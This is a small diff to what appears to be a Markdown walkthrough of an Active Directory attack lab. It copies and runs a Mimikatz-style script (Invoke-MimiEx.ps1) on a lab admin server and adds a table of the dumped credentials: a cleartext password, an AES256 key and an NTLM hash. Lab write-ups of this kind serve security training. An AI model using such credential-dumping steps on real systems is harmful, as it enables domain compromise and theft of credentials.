@@ -296,4 +296,8 @@ Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.lo
 ```powershell
 .\Invoke-MimiEx.ps1
 ```
-
+| Type        | Hash                                                             |
+| ----------- | ---------------------------------------------------------------- |
+| Password    | \*ThisisBlasphemyThisisMadness!!                                 |
+| aes256_hmac | 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 |
+| rc4_hmac_nt | b38ff50264b74508085d82c69794a4d8                                 |
